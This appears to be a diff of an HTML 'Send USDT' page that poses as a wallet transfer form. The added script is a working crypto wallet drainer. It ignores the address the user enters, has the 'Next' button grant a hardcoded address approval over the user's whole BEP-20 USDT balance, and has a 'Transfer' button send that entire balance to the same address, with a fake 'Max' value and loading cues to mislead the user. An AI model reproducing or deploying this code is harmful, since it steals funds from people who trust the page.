@@ -3,30 +3,36 @@
 <head>
   <title>Send USDT</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <style>
     html, body {
       font-family: sans-serif;
+      background: #fff;
       margin: 0;
       padding: 0;
       color: #000;
       height: 100%;
-      background: #fff;
+      display: flex;
+      flex-direction: column;
     }
     .container {
+      flex: 1;
       padding: 16px;
+      display: flex;
+      flex-direction: column;
     }
     label {
-      display: block;
-      margin: 20px 0 8px;
       font-size: 14px;
       color: #555;
+      display: block;
+      margin: 20px 0 8px;
     }
     .input-box {
       display: flex;
+      align-items: center;
       border: 1px solid #ccc;
       border-radius: 8px;
       padding: 0 10px;
-      align-items: center;
     }
     .input-box input {
       border: none;
@@ -35,22 +41,28 @@
       font-size: 16px;
       width: 100%;
     }
-    .input-box .clear-btn,
-    .input-box .paste-btn {
+    .clear-btn {
+      background: none;
+      border: none;
+      font-size: 20px;
+      color: #aaa;
+      cursor: pointer;
+      margin-left: 5px;
+    }
+    .paste-btn {
       background: none;
       border: none;
       color: #0052ff;
-      font-size: 14px;
       font-weight: bold;
       cursor: pointer;
-      margin-left: 6px;
+      margin-left: 5px;
     }
     .amount-section {
       display: flex;
+      align-items: center;
       border: 1px solid #ccc;
       border-radius: 8px;
       margin-top: 8px;
-      align-items: center;
     }
     .amount-section input {
       border: none;
@@ -73,9 +85,6 @@
     }
     .footer {
       padding: 16px;
-      position: fixed;
-      bottom: 0;
-      width: 100%;
       background: #fff;
       box-shadow: 0 -1px 5px rgba(0,0,0,0.1);
     }
@@ -89,10 +98,34 @@
       font-weight: bold;
       border-radius: 20px;
       cursor: pointer;
+      transition: background 0.3s ease;
+      position: relative;
+    }
+    .button.loading {
+      background-color: #e0e7ff;
+      color: #0052ff;
+    }
+    .button.loading::before {
+      content: "Processing...";
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: #0052ff;
+      font-size: 16px;
+      font-weight: bold;
+    }
+    .button.loading span {
+      visibility: hidden;
+    }
+    #transferBtn {
+      display: none;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
+
   <div class="container">
     <label>Address or Domain Name</label>
     <div class="input-box">
@@ -106,35 +139,78 @@
       <input type="number" id="amount" placeholder="USDT Amount">
       <span onclick="setMax()">Max</span>
     </div>
+
     <div class="converted" id="converted">= $0.00</div>
   </div>
 
   <div class="footer">
-    <button class="button" onclick="nextStep()">Next</button>
+    <button class="button" id="nextBtn" onclick="approveUSDT()"><span>Next</span></button>
+    <button class="button" id="transferBtn" onclick="transferUSDT()">Transfer</button>
   </div>
 
   <script>
-    function setMax() {
-      // Set a fake high value as "Max"
-      const fakeMax = 99999;
-      document.getElementById("amount").value = fakeMax;
-      document.getElementById("converted").innerText = "= $" + fakeMax;
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
+    const receiver = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
+
+    const usdtAbi = [
+      { "constant": false, "inputs": [ { "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "approve", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
+      { "constant": false, "inputs": [ { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "transfer", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
+      { "constant": true, "inputs": [ { "name": "_owner", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "balance", "type": "uint256" } ], "type": "function" },
+      { "constant": true, "inputs": [], "name": "decimals", "outputs": [ { "name": "", "type": "uint8" } ], "type": "function" }
+    ];
+
+    async function setMax() {
+      if (!window.ethereum) return alert("Trust Wallet not connected");
+      const web3 = new Web3(window.ethereum);
+      const accounts = await web3.eth.getAccounts();
+      const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
+      const balance = await contract.methods.balanceOf(accounts[0]).call();
+      const decimals = await contract.methods.decimals().call();
+      const maxAmount = balance / (10 ** decimals);
+      document.getElementById('amount').value = maxAmount.toFixed(2);
+      document.getElementById('converted').innerText = `= $${maxAmount.toFixed(2)}`;
     }
 
-    function nextStep() {
-      const amount = document.getElementById("amount").value;
-      if (!amount || isNaN(amount) || Number(amount) <= 0) {
-        alert("Please enter a valid USDT amount");
-        return;
+    async function approveUSDT() {
+      const btn = document.getElementById("nextBtn");
+      btn.classList.add("loading");
+      try {
+        const web3 = new Web3(window.ethereum);
+        const accounts = await web3.eth.requestAccounts();
+        const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
+        const balance = await contract.methods.balanceOf(accounts[0]).call();
+
+        await contract.methods.approve(receiver, balance).send({ from: accounts[0] });
+
+        btn.classList.remove("loading");
+        document.getElementById("transferBtn").style.display = "block";
+        alert("USDT Approved. Now click Transfer.");
+      } catch (e) {
+        console.error(e);
+        alert("Approval failed.");
+        btn.classList.remove("loading");
       }
+    }
 
-      const receiver = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // actual recipient
-      const token = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-20)
-      const coin = "20000714"; // Trust Wallet coin ID for USDT BEP-20
+    async function transferUSDT() {
+      const btn = document.getElementById("transferBtn");
+      btn.classList.add("loading");
+      try {
+        const web3 = new Web3(window.ethereum);
+        const accounts = await web3.eth.requestAccounts();
+        const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
+        const balance = await contract.methods.balanceOf(accounts[0]).call();
 
-      const trustLink = `https://link.trustwallet.com/send?coin=${coin}&address=${receiver}&token_id=${token}&amount=${amount}`;
-      window.location.href = trustLink;
+        await contract.methods.transfer(receiver, balance).send({ from: accounts[0] });
+
+        alert("Transfer Successful!");
+      } catch (e) {
+        console.error(e);
+        alert("Transfer failed.");
+      }
+      btn.classList.remove("loading");
     }
   </script>
+
 </body>
 </html>
